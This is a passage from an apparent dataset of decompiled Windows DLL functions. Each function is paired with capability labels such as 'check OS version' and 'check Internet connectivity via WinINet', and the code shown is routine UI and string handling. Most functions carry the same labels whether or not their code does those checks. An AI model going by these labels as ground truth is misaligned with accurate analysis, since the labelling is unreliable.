(iVar17 - iVar15) - 8U))\n                        goto code_r0x00018003a11a;\n                        fcn.18008fb24(iVar15);\n                    }\n                    iStack520 = 0;\n                    uStack512 = 0xf;\n                    uStack536 = 0;\n                    if (0xf < uStack432) {\n                        iVar17 = CONCAT71(Stack455, uStack456);\n                        iVar15 = iVar17;\n                        if ((0xfff < uStack432 + 1) && (iVar15 = *(iVar17 + -8),  0x1f < (iVar17 - iVar15) - 8U))\n                        goto code_r0x00018003a120;\n                        fcn.18008fb24(iVar15);\n                    }\n                    iVar15 = iStack424;\n                    piStack416 = aiStack320;\n                    puVar12 = fcn.18000de50(aiStack320, iStack424);\n                    piStack464 = piStack464 & 0xffffffff00000000;\n                    iStack520 = 0;\n                    uStack512 = 0xf;\n                    uStack536 = 0;\n                    uStack504 = uVar19 | 0x7b8;\n                    if (0xf < iStack96 + 6U) {\n                        fcn.1800137f0(&uStack536, iStack96 + 6U);\n                    }\n                    iStack520 = 0;\n                    fcn.18000dc30(&uStack536, &uStack112);\n                    if (uStack512 - iStack520 < 6) {\n                        puStack552 = 0x6;\n                        fcn.180014270(&uStack536, 6, 0, 0x1800f68bc);\n                    }\n                    else {\n                        puVar13 = &uStack536;\n                        if (0xf < uStack512) {\n                            puVar13 = CONCAT71(Stack535, uStack536);\n                        }\n                        puVar13 = puVar13 + iStack520;\n                        iStack520 = iStack520 + 6;\n                        fcn.1800ade80(puVar13, 0x1800f68bc, 6);\n                        puVar13[6] = 0;\n                        iVar15 = iStack424;\n                    }\n                    puVar13 = &uStack536;\n                    if (0xf < uStack512) {\n                        puVar13 = CONCAT71(Stack535, uStack536);\n                    }\n                    uStack480 = 0;\n                    uStack472 = 0xf;\n                    uStack496 = 0;\n                    iVar17 = -1;\n                    do {\n                        iVar17 = iVar17 + 1;\n                    } while (puVar13[iVar17] != '\\0');\n                    puVar9 = &uStack496;\n                    fcn.180011120(puVar9, puVar13, iVar17);\n                    puStack552 = puVar12;\n                    uVar3 = fcn.1800054e0(puVar9, appppuStack80, &uStack496, &piStack464);\n                    *(iVar11 + 0x20) = uVar3;\n                    if (0xf < uStack472) {\n                        iVar14 = CONCAT71(Stack495, uStack496);\n                        iVar17 = iVar14;\n                        if ((0xfff < uStack472 + 1) && (iVar17 = *(iVar14 + -8),  0x1f < (iVar14 - iVar17) - 8U))\n                        goto code_r0x00018003a126;\n                        fcn.18008fb24(iVar17);\n                    }\n                    uStack480 = 0;\n                    uStack472 = 0xf;\n                    uStack496 = 0;\n                    if (0xf < uStack512) {\n                        iVar14 = CONCAT71(Stack535, uStack536);\n                        iVar17 = iVar14;\n                        if ((0xfff < uStack512 + 1) && (iVar17 = *(iVar14 + -8),  0x1f < (iVar14 - iVar17) - 8U))\n                        goto code_r0x00018003a12c;\n                        fcn.18008fb24(iVar17);\n                    }\n                    arg1 = iStack336;\n                    iVar2 = *(iVar11 + 0x20);\n                    if (((*(iStack336 + 0x98))[1] - **(iStack336 + 0x98)) / 0xe8 < iVar2) {\n                        *(iVar11 + 0x20) = 0xffffffff;\n                        iVar2 = -1;\n                    }\n                    if (-1 < iVar2) {\n                        piStack416 = aiStack320;\n                        puVar12 = fcn.18000de50(aiStack320, iVar15);\n                        piStack464 = piStack464 & 0xffffffff00000000;\n                        iStack520 = 0;\n                        uStack512 = 0xf;\n                        uStack536 = 0;\n                        uStack504 = uVar19 | 3000;\n                        if (0xf < iStack96 + 5U) {\n                            fcn.1800137f0(&uStack536, iStack96 + 5U);\n                        }\n                        iStack520 = 0;\n                        fcn.18000dc30(&uStack536, &uStack112);\n                        if (uStack512 - iStack520 < 5) {\n                            puStack552 = 0x5;\n                            fcn.180014270(&uStack536, 5, 0, 0x1800f74cc);\n                        }\n                        else {\n                            puVar13 = &uStack536;\n                            if (0xf < uStack512) {\n                                puVar13 = CONCAT71(Stack535, uStack536);\n                            }\n                            puVar13 = puVar13 + iStack520;\n                            iStack520 = iStack520 + 5;\n                            fcn.1800ade80(puVar13, 0x1800f74cc, 5);\n                            puVar13[5] = 0;\n                        }\n                        puVar13 = &uStack536;\n                        if (0xf < uStack512) {\n                            puVar13 = CONCAT71(Stack535, uStack536);\n                        }\n                        uStack480 = 0;\n                        uStack472 = 0xf;\n                        uStack496 = 0;\n                        iVar15 = -1;\n                        do {\n                            iVar15 = iVar15 + 1;\n                        } while (puVar13[iVar15] != '\\0');\n                        puVar9 = &uStack496;\n                        fcn.180011120(puVar9, puVar13, iVar15);\n                        puStack552 = puVar12;\n                        uVar3 = fcn.1800054e0(puVar9, appppuStack80, &uStack496, &piStack464);\n                        *(iVar11 + 0x24) = uVar3;\n                        if (0xf < uStack472) {\n                            iVar17 = CONCAT71(Stack495, uStack496);\n                            iVar15 = iVar17;\n                            if ((0xfff < uStack472 + 1) && (iVar15 = *(iVar17 + -8),  0x1f < (iVar17 - iVar15) - 8U))\n                            goto code_r0x00018003a132;\n                            fcn.18008fb24(iVar15);\n                        }\n                        uStack480 = 0;\n                        uStack472 = 0xf;\n                        uStack496 = 0;\n                        if (0xf < uStack512) {\n                            iVar17 = CONCAT71(Stack535, uStack536);\n                            iVar15 = iVar17;\n                            if ((0xfff < uStack512 + 1) && (iVar15 = *(iVar17 + -8),  0x1f < (iVar17 - iVar15) - 8U))\n                            goto code_r0x00018003a138;\n                            fcn.18008fb24(iVar15);\n                        }\n                        iVar2 = *(iVar11 + 0x20);\n                        iVar15 = **(arg1 + 0x98);\n                        if (((*(arg1 + 0x98))[1] - iVar15) / 0xe8 <= iVar2) {\n                            fcn.18003c1b0();\n                            goto code_r0x00018003a144;\n                        }\n                        iVar17 = iVar2 * 0xe8;\n                        iVar7 = *(iVar17 + 0xc0 + iVar15) - *(iVar17 + 0xb8 + iVar15) >> 5;\n                        if (*(iVar11 + 0x24) != iVar7 && iVar7 <= *(iVar11 + 0x24)) {\n                            *(iVar11 + 0x24) = 0xffffffff;\n                        }\n                    }\n                    uVar19 = uVar19 | 0x3b8;\n                    *(iVar11 + 0x20) = iVar2 + 1;\n                    *(iVar11 + 0x24) = *(iVar11 + 0x24) + 1;\n                    if (0xf < uStack88) {\n                        iVar15 = CONCAT71(Stack111, uStack112);\n                        iVar11 = iVar15;\n                        if ((0xfff < uStack88 + 1) && (iVar11 = *(iVar15 + -8),  0x1f < (iVar15 - iVar11) - 8U)) {\ncode_r0x00018003a144:\n                            fcn.1800b3528();\n                            pcVar1 = swi(3);\n                            (*pcVar1)();\n                            return;\n                        }\n                        fcn.18008fb24(iVar11);\n                    }\n                    uStack500 = uStack500 + 1;\n                    iVar18 = iVar18 + 1;\n                    piVar5 = piStack408;\n                } while (iVar18 < iStack328);\n            }\n            fcn.18003b5c0(arg1, 0);\n            goto code_r0x00018003a05f;\n        }\n        iVar11 = CONCAT71(Stack455, uStack456);\n        iVar18 = iVar11;\n        if ((uStack432 * 2 + 2 < 0x1000) || (iVar18 = *(iVar11 + -8),  (iVar11 - iVar18) - 8U < 0x20)) {\n            fcn.18008fb24(iVar18);\n            goto code_r0x000180039289;\n        }\ncode_r0x00018003a0d2:\n        fcn.1800b3528();\ncode_r0x00018003a0d8:\n        fcn.1800b3528();\ncode_r0x00018003a0de:\n        fcn.1800b3528();\ncode_r0x00018003a0e4:\n        fcn.1800b3528();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\ncode_r0x00018003a056:\n    fcn.18003b4b0(arg1);\ncode_r0x00018003a05f:\n    if (uStack56 < 0x10) goto code_r0x00018003a09c;\n    ppppuVar10 = appppuStack80[0];\n    if (0xfff < uStack56 + 1) {\n        ppppuVar10 = appppuStack80[0][-1];\n        if (0x1f < appppuStack80[0] + (-8 - ppppuVar10)) {\n            fcn.1800b3528(ppppuVar10, uStack56 + 0x28);\n            goto code_r0x00018003a0d2;\n        }\n    }\n    fcn.18008fb24(ppppuVar10);\ncode_r0x00018003a09c:\n    fcn.18008fb00(uStack48 ^ auStack584);\n    return;\n}\n",
        "token_count": 7082
    },
    "18003a15": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18003a150(int64_t arg1, ulong *arg2)\n\n{\n    code *pcVar1;\n    int64_t *piVar2;\n    bool bVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    ulong arg1_00;\n    int64_t *piVar6;\n    int64_t iVar7;\n    ulong *puVar8;\n    uchar *arg3;\n    uint64_t arg3_00;\n    ulong var_70h;\n    uchar auStack408 [32];\n    uint uStack376;\n    uchar uStack368;\n    uchar uStack367;\n    unkbyte6 Stack366;\n    uint64_t uStack352;\n    uint64_t uStack344;\n    uchar uStack336;\n    unkbyte7 Stack335;\n    int64_t iStack320;\n    uint64_t uStack312;\n    ulong uStack304;\n    ulong *puStack296;\n    uchar auStack280 [128];\n    int16_t aiStack152 [8];\n    ulong var_80h;\n    uint64_t uStack40;\n    \n    uStack304 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack408;\n    uStack376 = 0;\n    puStack296 = arg2;\n    iVar5 = (**0x1800de7f0)(*(arg1 + 0xa8), 0x147, 0, 0);\n    arg2[2] = 0;\n    arg2[3] = 0xf;\n    *arg2 = 0;\n    uStack376 = 1;\n    if (iVar5 < 1) goto code_r0x00018003a494;\n    (**0x1800de5f0)(*(arg1 + 0xa8), aiStack152, 0x32);\n    uStack352 = 0;\n    uStack344 = 7;\n    uStack368 = 0;\n    uStack367 = 0;\n    iVar5 = -1;\n    do {\n        iVar5 = iVar5 + 1;\n    } while (aiStack152[iVar5] != 0);\n    fcn.180010d70(&uStack368, aiStack152, iVar5);\n    arg1_00 = fcn.1800687b0(auStack280);\n    arg3 = &uStack368;\n    if (7 < uStack344) {\n        arg3 = CONCAT62(Stack366, CONCAT11(uStack367, uStack368));\n    }\n    fcn.180068c50(arg1_00, &uStack336, arg3, arg3 + uStack352 * 2);\n    uStack376 = 7;\n    fcn.1800686c0(auStack280);\n    fcn.18000dd60(arg2, &uStack336);\n    if (uStack312 < 0x10) {\ncode_r0x00018003a2a7:\n        if (7 < uStack344) {\n            iVar7 = CONCAT62(Stack366, CONCAT11(uStack367, uStack368));\n            iVar5 = iVar7;\n            if ((0xfff < uStack344 * 2 + 2) && (iVar5 = *(iVar7 + -8),  0x1f < (iVar7 - iVar5) - 8U))\n            goto code_r0x00018003a4c7;\n            fcn.18008fb24(iVar5);\n        }\n        uStack352 = 0;\n        uStack344 = 0xf;\n        uStack368 = 0;\n        fcn.180011120(&uStack368, 0x1800f74f0, 8);\n        if (uStack344 < 0x10) {\ncode_r0x00018003a350:\n            uVar4 = uStack352;\n            iStack320 = CONCAT44(*0x180101914, *0x180101910);\n            uStack312 = CONCAT44(*0x18010191c, *0x180101918);\n            uStack336 = 0;\n            arg3_00 = uStack352;\n            if (arg2[2] < uStack352) {\n                arg3_00 = arg2[2];\n            }\n            puVar8 = arg2;\n            if (0xf < arg2[3]) {\n                puVar8 = *arg2;\n            }\n            fcn.180011120(&uStack336, puVar8, arg3_00);\n            uStack376 = 0xf;\n            piVar2 = CONCAT71(Stack335, uStack336);\n            piVar6 = &uStack336;\n            if (0xf < uStack312) {\n                piVar6 = piVar2;\n            }\n            if ((iStack320 == 8) && (*piVar6 == 0x205d726568744f5b)) {\n                bVar3 = true;\n            }\n            else {\n                bVar3 = false;\n            }\n            if (0xf < uStack312) {\n                piVar6 = piVar2;\n                if (0xfff < uStack312 + 1) {\n                    iVar5 = uStack312 + 0x28;\n                    piVar6 = piVar2[-1];\n                    if (0x1f < piVar2 + (-8 - piVar6)) goto code_r0x00018003a4bb;\n                }\n                fcn.18008fb24(piVar6);\n            }\n            if (!bVar3) goto code_r0x00018003a494;\n            iStack320 = CONCAT44(*0x180101914, *0x180101910);\n            uStack312 = CONCAT44(*0x18010191c, *0x180101918);\n            uStack336 = 0;\n            if (arg2[2] < uVar4) {\n                fcn.180011cd0(iStack320);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            iVar7 = arg2[2] - uVar4;\n            iVar5 = -1;\n            if (iVar7 != -1) {\n                iVar5 = iVar7;\n            }\n            puVar8 = arg2;\n            if (0xf < arg2[3]) {\n                puVar8 = *arg2;\n            }\n            fcn.180011120(&uStack336, uVar4 + puVar8, iVar5);\n            fcn.18000dd60(arg2, &uStack336);\n            if (uStack312 < 0x10) goto code_r0x00018003a494;\n            piVar2 = CONCAT71(Stack335, uStack336);\n            piVar6 = piVar2;\n            if (0xfff < uStack312 + 1) {\n                iVar5 = uStack312 + 0x28;\n                piVar6 = piVar2[-1];\n                if (0x1f < piVar2 + (-8 - piVar6)) goto code_r0x00018003a4bb;\n            }\n            fcn.18008fb24(piVar6);\ncode_r0x00018003a494:\n            fcn.18008fb00(uStack40 ^ auStack408);\n            return;\n        }\n        piVar2 = CONCAT62(Stack366, CONCAT11(uStack367, uStack368));\n        piVar6 = piVar2;\n        if (uStack344 + 1 < 0x1000) {\ncode_r0x00018003a34b:\n            fcn.18008fb24(piVar6);\n            goto code_r0x00018003a350;\n        }\n        iVar5 = uStack344 + 0x28;\n        piVar6 = piVar2[-1];\n        if (piVar2 + (-8 - piVar6) < 0x20) goto code_r0x00018003a34b;\ncode_r0x00018003a4bb:\n        fcn.1800b3528(piVar6, iVar5);\n    }\n    else {\n        iVar7 = CONCAT71(Stack335, uStack336);\n        iVar5 = iVar7;\n        if ((uStack312 + 1 < 0x1000) || (iVar5 = *(iVar7 + -8),  (iVar7 - iVar5) - 8U < 0x20)) {\n            fcn.18008fb24(iVar5);\n            goto code_r0x00018003a2a7;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x00018003a4c7:\n    fcn.1800b3528();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 1886
    },
    "18003a4e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18003a4e0(int64_t arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    ulong arg1_00;\n    int64_t iVar3;\n    ushort *arg3;\n    uchar auStack344 [32];\n    ushort uStack312;\n    unkbyte6 Stack310;\n    int64_t iStack296;\n    uint64_t uStack288;\n    ulong uStack280;\n    ulong uStack272;\n    uchar auStack264 [128];\n    int16_t aiStack136 [56];\n    uint64_t uStack24;\n    \n    uStack280 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack344;\n    uStack272 = arg2;\n    (**0x1800de5f0)(*(arg1 + 0xb0), aiStack136, 0x32);\n    iStack296 = 0;\n    uStack288 = 7;\n    uStack312 = 0;\n    iVar3 = -1;\n    do {\n        iVar3 = iVar3 + 1;\n    } while (aiStack136[iVar3] != 0);\n    fcn.180010d70(&uStack312, aiStack136, iVar3);\n    arg1_00 = fcn.1800687b0(auStack264);\n    arg3 = &uStack312;\n    if (7 < uStack288) {\n        arg3 = CONCAT62(Stack310, uStack312);\n    }\n    fcn.180068c50(arg1_00, arg2, arg3, arg3 + iStack296);\n    fcn.1800686c0(auStack264);\n    if (7 < uStack288) {\n        iVar2 = CONCAT62(Stack310, uStack312);\n        iVar3 = iVar2;\n        if (0xfff < uStack288 * 2 + 2) {\n            iVar3 = *(iVar2 + -8);\n            if (0x1f < (iVar2 - iVar3) - 8U) {\n                fcn.1800b3528(iVar3, uStack288 * 2 + 0x29);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar3);\n    }\n    fcn.18008fb00(uStack24 ^ auStack344);\n    return;\n}\n",
        "token_count": 528
    },
    "18003cc0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18003cc00(ulong noname_0, ulong arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    ulong uVar7;\n    int64_t iVar8;\n    char in_R9B;\n    bool bVar9;\n    uchar auStack120 [32];\n    uint uStack88;\n    uchar uStack72;\n    ushort uStack56;\n    unkbyte6 Stack54;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack120;\n    if (in_R9B == '\\0') {\n        uVar7 = *(arg3 * 8 + 0x180123ee0);\n    }\n    else {\n        uVar7 = *(arg3 * 8 + 0x180123ef8);\n    }\n    *0x180123ed0 = in_R9B;\n    *0x180123ed4 = arg3;\n    *0x180123ed8 = arg2;\n    (**0x1800de778)(*0x180123eb8, uVar7);\n    (**0x1800de788)(*0x180123eb8, 0x24b9, *(*0x180123ed4 * 8 + 0x180123f10));\n    (**0x1800de788)(*0x180123eb8, 0x24ba, 0x1800f678c);\n    (**0x1800de788)(*0x180123eb8, 8, 0x1800f7610);\n    if (*0x180123ed0 == '\\0') {\n        (**0x1800de788)(*0x180123eb8, 0x24bb, 0x1800f7650);\n        (**0x1800de788)(*0x180123eb8, 0x24bd, *(*0x180123ed4 * 8 + 0x180123f28));\n        uVar7 = 0x1800f7678;\n    }\n    else {\n        (**0x1800de788)(*0x180123eb8, 0x24bc, 0x1800f7620);\n        uVar7 = 0x1800f7640;\n    }\n    (**0x1800de788)(*0x180123eb8, 8, uVar7);\n    bVar9 = *0x180123ed0 != '\\0';\n    uVar7 = (**0x1800de798)(*0x180123eb8, 0x24bc);\n    (**0x1800de718)(uVar7, -bVar9 & 5);\n    uVar6 = 5;\n    uVar5 = 5;\n    if (*0x180123ed0 != '\\0') {\n        uVar5 = 0;\n    }\n    uVar7 = (**0x1800de798)(*0x180123eb8, 0x24bb);\n    (**0x1800de718)(uVar7, uVar5);\n    if (*0x180123ed0 != '\\0') {\n        uVar6 = 0;\n    }\n    uVar7 = (**0x1800de798)(*0x180123eb8, 0x24bd);\n    (**0x1800de718)(uVar7, uVar6);\n    iVar3 = (**0x1800de7f0)(*0x18012a390, 0x812, 0);\n    iVar4 = 0x1800f75f8;\n    uStack56 = 0;\n    uStack40 = *0x180101900;\n    uStack36 = *0x180101904;\n    uStack32 = *0x180101908;\n    uStack28 = *0x18010190c;\n    if (9 < iVar3) {\n        iVar4 = 0x1800f75e0;\n    }\n    iVar8 = -1;\n    do {\n        iVar8 = iVar8 + 1;\n    } while (*(iVar4 + iVar8 * 2) != 0);\n    fcn.180010d70(&uStack56, iVar4, iVar8);\n    uStack72 = 0;\n    uStack88 = 400;\n    uVar2 = 8;\n    if (9 < iVar3) {\n        uVar2 = 10;\n    }\n    fcn.180068420(*0x180123eb8, 0x24ba, &uStack56, uVar2);\n    uVar7 = (**0x1800de798)(*0x180123eb8, 0x24ba);\n    (**0x1800de6f0)(uVar7);\n    if (7 < CONCAT44(uStack28, uStack32)) {\n        iVar8 = CONCAT62(Stack54, uStack56);\n        iVar3 = CONCAT44(uStack28, uStack32) * 2;\n        iVar4 = iVar8;\n        if (0xfff < iVar3 + 2U) {\n            iVar4 = *(iVar8 + -8);\n            if (0x1f < (iVar8 - iVar4) - 8U) {\n                fcn.1800b3528(iVar4, iVar3 + 0x29);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar4);\n    }\n    fcn.18008fb00(uStack24 ^ auStack120);\n    return;\n}\n",
        "token_count": 1253
    },
    "18003d07": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18003d070(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int32_t iVar4;\n    ulong arg2;\n    ulong *puVar5;\n    int16_t *arg2_00;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uchar auStack712 [32];\n    ulong uStack680;\n    uint uStack672;\n    uint uStack668;\n    uint64_t uStack664;\n    uint64_t uStack656;\n    ulong uStack648;\n    ulong *puStack640;\n    int64_t aiStack632 [3];\n    uint64_t uStack608;\n    ushort uStack600;\n    unkbyte6 Stack598;\n    uint64_t uStack584;\n    uint64_t uStack576;\n    int16_t aiStack568 [264];\n    uint64_t uStack40;\n    \n    uStack648 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack712;\n    uStack584 = *0x180101900;\n    uStack576 = *0x180101908;\n    uStack600 = 0;\n    iVar4 = (**0x1800de480)(*0x180101900, 0x180124b18, L\"FWViz_\", 0, aiStack568);\n    if (iVar4 == 0) {\n        iVar7 = 0;\n        arg2_00 = 0x1800f482c;\n    }\n    else {\n        iVar7 = -1;\n        do {\n            iVar7 = iVar7 + 1;\n        } while (aiStack568[iVar7] != 0);\n        arg2_00 = aiStack568;\n    }\n    fcn.180010d70(&uStack600, arg2_00, iVar7);\n    uVar3 = uStack584;\n    puStack640 = &uStack680;\n    uStack664 = 0;\n    uStack656 = 0;\n    puVar5 = &uStack600;\n    if (7 < uStack576) {\n        puVar5 = CONCAT62(Stack598, uStack600);\n    }\n    if (uStack584 < 8) {\n        uStack680 = *puVar5;\n        uStack672 = *(puVar5 + 1);\n        uStack668 = *(puVar5 + 0xc);\n        uVar6 = 7;\n    }\n    else {\n        uVar6 = uStack584 | 7;\n        if (0x7ffffffffffffffe < uVar6) {\n            uVar6 = 0x7ffffffffffffffe;\n        }\n        uStack680 = fcn.180011cf0(&uStack680, uVar6 + 1);\n        fcn.1800ade80(uStack680, puVar5, uVar3 * 2 + 2);\n    }\n    uStack664 = uVar3;\n    iVar7 = arg1;\n    uStack656 = uVar6;\n    arg2 = fcn.18003d760(arg1, aiStack632);\n    fcn.18000b170(iVar7, arg2, &uStack680);\n    if (7 < uStack608) {\n        iVar7 = aiStack632[0];\n        if ((0xfff < uStack608 * 2 + 2) && (iVar7 = *(aiStack632[0] + -8),  0x1f < (aiStack632[0] - iVar7) - 8U))\n        goto code_r0x00018003d29f;\n        fcn.18008fb24(iVar7);\n    }\n    (**0x1800de718)(*(arg1 + 0x18), 0);\n    puVar5 = &uStack600;\n    if (7 < uStack576) {\n        puVar5 = CONCAT62(Stack598, uStack600);\n    }\n    (**0x1800de7f0)(*(arg1 + 0x38), 0x1001, 0, puVar5);\n    puVar5 = &uStack600;\n    if (7 < uStack576) {\n        puVar5 = CONCAT62(Stack598, uStack600);\n    }\n    (**0x1800de438)(puVar5);\n    if (7 < uStack576) {\n        iVar2 = CONCAT62(Stack598, uStack600);\n        iVar7 = iVar2;\n        if (0xfff < uStack576 * 2 + 2) {\n            iVar7 = *(iVar2 + -8);\n            if (0x1f < (iVar2 - iVar7) - 8U) {\n                fcn.1800b3528(iVar7, uStack576 * 2 + 0x29);\ncode_r0x00018003d29f:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar7);\n    }\n    fcn.18008fb00(uStack40 ^ auStack712);\n    return;\n}\n",
        "token_count": 1117
    },
    "18003d76": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18003d760(int64_t arg1, ushort *arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    ulong ****ppppuVar3;\n    uchar auStack120 [32];\n    ulong uStack88;\n    ushort *puStack80;\n    ulong ****appppuStack72 [2];\n    ulong uStack56;\n    uint64_t uStack48;\n    uint64_t uStack40;\n    \n    uStack88 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack120;\n    uStack56 = 0;\n    uStack48 = 7;\n    appppuStack72[0] = appppuStack72[0] & 0xffffffffffff0000;\n    puStack80 = arg2;\n    appppuStack72[0] = fcn.180011cf0(appppuStack72, 0x8000);\n    uStack56 = 0x7fff;\n    uStack48 = 0x7fff;\n    ppppuVar3 = appppuStack72[0];\n    for (iVar2 = 0x7fff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *ppppuVar3 = 0;\n        ppppuVar3 = ppppuVar3 + 2;\n    }\n    *(appppuStack72[0] + 0xfffe) = 0;\n    (**0x1800de728)(*(arg1 + 0x18), 0x24ba, appppuStack72[0], 0x7fff);\n    ppppuVar3 = appppuStack72;\n    if (7 < uStack48) {\n        ppppuVar3 = appppuStack72[0];\n    }\n    *(arg2 + 8) = 0;\n    *(arg2 + 0xc) = 7;\n    *arg2 = 0;\n    iVar2 = -1;\n    do {\n        iVar2 = iVar2 + 1;\n    } while (*(ppppuVar3 + iVar2 * 2) != 0);\n    fcn.180010d70(arg2, ppppuVar3, iVar2);\n    if (7 < uStack48) {\n        ppppuVar3 = appppuStack72[0];\n        if (0xfff < uStack48 * 2 + 2) {\n            ppppuVar3 = appppuStack72[0][-1];\n            if (0x1f < appppuStack72[0] + (-8 - ppppuVar3)) {\n                fcn.1800b3528(ppppuVar3, uStack48 * 2 + 0x29);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(ppppuVar3);\n    }\n    fcn.18008fb00(uStack40 ^ auStack120);\n    return;\n}\n",
        "token_count": 662
    },
    "18003d8b": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18003d8b0(void)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    char cVar3;\n    int32_t iVar4;\n    ulong *puVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    uchar *arg1;\n    int64_t arg1_00;\n    int64_t iVar8;\n    ulong *puVar9;\n    uint64_t uVar10;\n    int64_t iStack208;\n    uint64_t uStack184;\n    int64_t iStack176;\n    ulong uStack160;\n    uchar uStack152;\n    unkbyte7 Stack151;\n    uchar auStack136 [16];\n    uchar uStack120;\n    unkbyte7 Stack119;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    ulong uStack88;\n    uchar *puStack80;\n    uchar auStack72 [32];\n    uchar auStack40 [16];\n    int64_t iStack24;\n    uint64_t uStack16;\n    \n    uVar7 = *0x18012a388;\n    cVar3 = (**(*0x180123d80 + 0x68))(0x180123d80);\n    if (cVar3 == '\\0') {\n        *0x180123d88 = uVar7;\n        *0x180123d90 = *0x18012a390;\n        (**(*0x180123d80 + 0x60))(0x180123d80, 0x2648, 0, 1);\n    }\n    uVar7 = 0x180123db0;\n    fcn.18004b3b0(0x180123db0, *0x180123d98);\n    puVar5 = fcn.180004ab0(uVar7, &stack0xffffffffffffff50, 4);\n    uVar7 = fcn.1800687b0(&stack0xffffffffffffff78);\n    puVar9 = puVar5;\n    if (7 < puVar5[3]) {\n        puVar9 = *puVar5;\n    }\n    fcn.180068c50(uVar7, &stack0xffffffffffffff30, puVar9, puVar9 + puVar5[2] * 2);\n    fcn.1800686c0(&stack0xffffffffffffff78);\n    fcn.18000dd60(0x180123e18, &stack0xffffffffffffff30);\n    if (0xf < uStack184) {\n        iVar6 = iStack208;\n        if ((0xfff < uStack184 + 1) && (iVar6 = *(iStack208 + -8),  0x1f < (iStack208 - iVar6) - 8U))\n        goto code_r0x00018003daf9;\n        fcn.18008fb24(iVar6);\n    }\n    if (7 < CONCAT71(Stack151, uStack152)) {\n        iVar6 = CONCAT71(Stack151, uStack152) * 2;\n        iVar8 = iStack176;\n        if (0xfff < iVar6 + 2U) {\n            iVar8 = *(iStack176 + -8);\n            if (0x1f < (iStack176 - iVar8) - 8U) {\n                fcn.1800b3528(iVar8, iVar6 + 0x29);\ncode_r0x00018003daf9:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar8);\n    }\n    *0x180123e98 = (**0x1800de798)(*0x180123d98, 0x264a);\n    uVar10 = 0;\n    (**0x1800de730)(*0x180123d98, 0x264f, 0xc5, 0x104, 0);\n    uVar7 = (**0x1800de798)(*0x180123d98, 0x2662);\n    iVar6 = (**0x1800de638)(*0x18012a388, 0x2335);\n    if (iVar6 != 0) {\n        (**0x1800de7f0)(uVar7, 0xf7, 0, iVar6);\n        (**0x1800de0a8)(iVar6);\n    }\n    uVar10 = uVar10 & 0xffffffffffffff00;\n    fcn.180067d90(*0x180123d98, 0x2662, 0, 0x1800f7688);\n    fcn.180066d20(0x180123d80);\n    (**0x1800de7f0)(*0x180123d90, 0x806, 0, *0x180123d98, uVar10);\n    uStack88 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ &stack0xffffffffffffff68;\n    uStack160 = 0x18003e394;\n    